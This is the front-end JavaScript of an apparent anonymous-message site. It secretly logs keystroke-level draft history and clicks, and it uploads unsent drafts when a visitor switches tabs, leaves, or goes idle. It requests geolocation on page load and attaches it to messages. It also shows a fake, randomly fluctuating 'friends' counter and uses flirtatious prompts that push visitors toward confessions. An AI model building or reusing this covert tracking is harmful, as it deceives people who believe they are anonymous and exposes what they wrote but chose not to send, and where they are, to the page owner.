// Configuration: Change this URL when deploying to production
const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
    ? 'http://localhost:3000' // Local backend
    : 'https://anonymous-message-site-llnb.onrender.com'; // Replace with your Render backend URL

const messageInput = document.getElementById('messageInput');
const submitBtn = document.getElementById('submitBtn');
const messagesContainer = document.getElementById('messagesContainer');
const friendsCountEl = document.getElementById('friendsCount');
const promptGhost = document.querySelector('.prompt-ghost');
const diceBtn = document.querySelector('.dice-btn');
const REDIRECT_URL = 'sent.html';
const shareTag = new URLSearchParams(window.location.search).get('from');

// Track time spent on page
const pageLoadTime = Date.now();
function getTimeOnPage() {
  return Math.round((Date.now() - pageLoadTime) / 1000); // in seconds
}

// Track if message was actually sent
let messageSent = false;

// Track abandoned messages when user leaves
window.addEventListener('beforeunload', (e) => {
  const currentText = messageInput?.value?.trim();
  
  // Clear inactivity timer on page exit
  if (inactivityTimer) {
    clearTimeout(inactivityTimer);
  }
  
  // Only track if there's meaningful text and message wasn't sent
  if (currentText && currentText.length >= 3 && !messageSent) {
    const payload = {
      partialMessage: currentText,
      timeOnPage: getTimeOnPage(),
      clickPatterns: clickPatterns,
      textHistory: textHistory,
      reason: 'page_exit'
    };
    if (shareTag) payload.shareTag = shareTag;

    console.log('🚀 Sending abandoned message:', payload);
    
    // Use fetch with keepalive - more reliable than sendBeacon
    fetch(`${API_URL}/abandoned-message`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true  // Ensures delivery even on page unload
    }).catch(err => console.log('❌ Error sending abandoned message:', err));
  }
});

// Also track on page visibility change (when user switches tabs)
document.addEventListener('visibilitychange', () => {
  if (document.hidden && !messageSent) {
    const currentText = messageInput?.value?.trim();
    if (currentText && currentText.length >= 3) {
      const payload = {
        partialMessage: currentText,
        timeOnPage: getTimeOnPage(),
        clickPatterns: clickPatterns,
        textHistory: textHistory,
        reason: 'tab_switched'
      };
      if (shareTag) payload.shareTag = shareTag;
      
      console.log('🚀 Sending abandoned message (tab switch):', payload);
      fetch(`${API_URL}/abandoned-message`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      }).catch(err => console.log('❌ Error sending abandoned message:', err));
    }
  }
});

// Track click patterns
const clickPatterns = [];
function trackClick(element, action) {
  clickPatterns.push({
    element,
    action,
    timestamp: Date.now() - pageLoadTime
  });
}

// Track text input history
const textHistory = [];
let lastRecordedText = '';
// Prefetched coordinates to avoid blocking on send
let prefetchedCoordinates = null;

// Inactivity timer for abandoned messages (2 minutes)
let inactivityTimer = null;
const INACTIVITY_TIMEOUT = 2 * 60 * 1000; // 2 minutes in milliseconds

function sendAbandonedMessage(reason = 'inactivity') {
    const currentText = messageInput?.value?.trim();
    
    // Only send if there's meaningful text and message wasn't sent
    if (currentText && currentText.length >= 3 && !messageSent) {
        const payload = {
            partialMessage: currentText,
            timeOnPage: getTimeOnPage(),
            clickPatterns: clickPatterns,
            textHistory: textHistory,
            reason: reason
        };
        if (shareTag) payload.shareTag = shareTag;

        console.log('🚨 Sending abandoned message due to:', reason, payload);
        
        fetch(`${API_URL}/abandoned-message`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        }).catch(err => console.log('❌ Error sending abandoned message:', err));
        
        // Clear the message to prevent duplicate sends
        messageInput.value = '';
        if (promptGhost) promptGhost.textContent = '';
    }
}

function resetInactivityTimer() {
    // Clear existing timer
    if (inactivityTimer) {
        clearTimeout(inactivityTimer);
    }
    
    // Only set timer if there's text and message hasn't been sent
    const currentText = messageInput?.value?.trim();
    if (currentText && currentText.length >= 3 && !messageSent) {
        inactivityTimer = setTimeout(() => {
            sendAbandonedMessage('inactivity_2min');
        }, INACTIVITY_TIMEOUT);
    }
}

// Get precise coordinates using Geolocation API (prompts user)
async function getCoordinates() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            () => resolve(null),
            { timeout: 3000, enableHighAccuracy: false, maximumAge: 60000 }
        );
    });
}

// Load messages on page load
document.addEventListener('DOMContentLoaded', async () => {
    // Start location fetch in background to avoid blocking later
    try {
        prefetchedCoordinates = await getCoordinates();
    } catch (_) {}
    loadMessages();
});

// Random prompt helper
const PROMPTS = [
  "What's something you never told me?",
  "Drop a hot take 🔥",
  "Your first impression of me?",
  "What should I do next?",
  "One secret goal you have?",
  "If we could travel, where to?",
  "Truth or dare?",
  "A song you think I’d love?",
  "Best advice you got?",
  "What made you smile today?",
  "I’ve had a crush on you for months 😳",
  "Your smile makes my day brighter 😊",
  "You’re the kind of person I’d love to get to know ❤️",
  "I think we’d make a cute couple ✨",
  "You caught my eye the moment I saw you 😏",
  "Would love to take you out sometime 😍",
  "What’s one thing you find irresistible in someone?",
  "Guess who has been thinking about you? 😉",
  "Your laugh is contagious, just saying 😄",
  "If I could see you right now, I’d…",
  "What’s your dream date?",
  "Confess something funny you did recently",
  "What’s the sweetest thing someone did for you?",
  "Who’s your celebrity crush?",
  "Would you rather cuddle or dance all night?",
  "What’s one thing you admire about me?",
  "Send me your best pickup line",
  "If we were in a movie, which scene would be ours?",
  "What’s the most romantic thing you’ve done?",
  "Do you believe in love at first sight?",
  "What’s your favorite way to be surprised?",
  "Describe your ideal weekend with someone special",
  "If I asked you out, what would you say?",
  "What’s your guilty pleasure?",
  "Who do you secretly think about?",
  "Favorite love song of all time?",
  "What makes your heart skip a beat?",
  "Describe your perfect first date",
  "Do you prefer texts or calls when flirting?",
  "What’s the most spontaneous thing you’ve done?",
  "If we could teleport, where would we go?",
  "Your favorite romantic movie?",
  "Ever had a secret admirer?",
  "Most memorable compliment you’ve received?",
  "What’s your love language?",
  "What’s the cutest thing someone could do for you?",
  "Do you believe in soulmates?",
  "Most romantic gesture you’ve witnessed?",
  "Share a flirty emoji that describes you",
  "If we were together, what’s the first thing we’d do?"
];


function setRandomPrompt(fillMessage = false) {
    const text = PROMPTS[Math.floor(Math.random() * PROMPTS.length)];
    if (promptGhost && !messageInput.value) promptGhost.textContent = text;
    if (fillMessage && messageInput) {
        messageInput.value = text;
        if (promptGhost) promptGhost.textContent = '';
    }
}

// Initialize prompt
setRandomPrompt(false);

// Auto-cycle prompt every 3 seconds when empty
setInterval(() => {
    if (!messageInput.value && promptGhost) {
        setRandomPrompt(false);
    }
}, 3000);

// Hide/show ghost prompt based on input
if (messageInput) {
    messageInput.addEventListener('input', () => {
        if (promptGhost) {
            promptGhost.textContent = messageInput.value ? '' : promptGhost.textContent || '';
        }
        // If cleared, repopulate a prompt
        if (!messageInput.value) setRandomPrompt(false);

        // Track text history (record when text changes)
        const currentText = messageInput.value;
        if (currentText !== lastRecordedText) {
            const entry = {
                text: currentText === '' ? '(cleared)' : currentText,
                timestamp: Math.round(Date.now() - pageLoadTime)
            };
            textHistory.push(entry);
            lastRecordedText = currentText;
        }
        
        // Reset inactivity timer on every keystroke
        resetInactivityTimer();
    });

    // Submit on Enter (desktop), allow Shift+Enter for newline
    messageInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            // Trigger the same action as clicking Send
            submitBtn.click();
        }
    });
}

// Dice click to insert prompt
if (diceBtn) {
    diceBtn.addEventListener('click', () => {
        trackClick('dice-btn', 'click');
        
        // Add rolling animation
        diceBtn.classList.add('rolling');
        
        // Remove animation class after it finishes
        setTimeout(() => {
            diceBtn.classList.remove('rolling');
        }, 200);
        
        setRandomPrompt(true);
    });
}

// Animate friends count up/down randomly
let friendsCount = friendsCountEl ? parseInt(friendsCountEl.textContent, 10) || 299 : 299;
if (friendsCountEl) {
    setInterval(() => {
        const delta = Math.floor(Math.random() * 7) - 2; // -2 to +4
        friendsCount = Math.max(120, friendsCount + delta);
        friendsCountEl.textContent = friendsCount.toString();
    }, 1000);
}

// Submit message
submitBtn.addEventListener('click', async () => {
    trackClick('submit-btn', 'click');
    const content = messageInput.value.trim();
    
    if (!content) {
        alert('Please enter a message');
        return;
    }
    
    const originalText = submitBtn.textContent;
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        // Use prefetched coordinates if available; don't block sending
        const coordinates = prefetchedCoordinates;

        const payload = { message: content };
        if (coordinates) payload.coordinates = coordinates;
        if (shareTag) payload.shareTag = shareTag;
        payload.timeOnPage = getTimeOnPage();
        payload.clickPatterns = clickPatterns;
        payload.textHistory = textHistory;

        const response = await fetch(`${API_URL}/message`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            messageSent = true; // Mark message as sent to prevent abandoned tracking
            
            // Clear inactivity timer since message was successfully sent
            if (inactivityTimer) {
                clearTimeout(inactivityTimer);
            }
            
            messageInput.value = '';
            // Redirect if configured, otherwise refresh messages
            if (REDIRECT_URL) {
                window.location.href = REDIRECT_URL;
                return;
            }
            loadMessages();
        } else {
            alert('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to connect to server. Make sure the backend is running.');
    }
    finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
});

// Load all messages
async function loadMessages() {
    try {
        const response = await fetch(`${API_URL}/messages`);
        const messages = await response.json();
        
        if (!messages || messages.length === 0) {
            messagesContainer.innerHTML = '<p class="no-messages">No messages yet. Be the first to share!</p>';
            return;
        }
        
        messagesContainer.innerHTML = messages
            .sort((a, b) => b.timestamp.localeCompare(a.timestamp)) // newest first
            .map(message => createMessageCard(message))
            .join('');
            
        // Add delete event listeners
        document.querySelectorAll('.delete-btn').forEach(btn => {
            btn.addEventListener('click', () => deleteMessage(btn.dataset.id));
        });
    } catch (error) {
        console.error('Error:', error);
        messagesContainer.innerHTML = '<p class="no-messages">Failed to load messages. Make sure the backend is running.</p>';
    }
}

// Create message card HTML
function createMessageCard(message) {
    const date = new Date(message.timestamp);
    
    // Add 5 hours 30 minutes to convert to Sri Lanka Time
    const sriLankaTime = new Date(date.getTime() + (5.5 * 60 * 60 * 1000));
    
    // Format: "Dec 14, 2025 at 3:45 PM"
    const dateFormatted = sriLankaTime.toLocaleDateString('en-US', { 
        month: 'short', 
        day: 'numeric', 
        year: 'numeric'
    });
    const timeFormatted = sriLankaTime.toLocaleTimeString('en-US', { 
        hour: 'numeric', 
        minute: '2-digit',
        hour12: true
    });
    const timeString = `${dateFormatted} at ${timeFormatted}`;
    
    const location = message.location || 'Unknown';
    
    return `
        <div class="message-card">
            <div class="message-content">${escapeHtml(message.message)}</div>
            <div class="message-footer">
                <div class="message-meta">
                    <span class="message-time">📅 ${timeString}</span>
                    <span class="message-location">📍 ${escapeHtml(location)}</span>
                </div>
                <button class="delete-btn" data-id="${message.id}">Delete</button>
            </div>
        </div>
    `;
}

// Delete message
async function deleteMessage(id) {
    if (!confirm('Are you sure you want to delete this message?')) return;
    
    try {
        const response = await fetch(`${API_URL}/message/${id}`, { method: 'DELETE' });
        if (response.ok) {
            loadMessages();
        } else {
            alert('Failed to delete message');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to connect to server');
    }
}

// Escape HTML to prevent XSS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
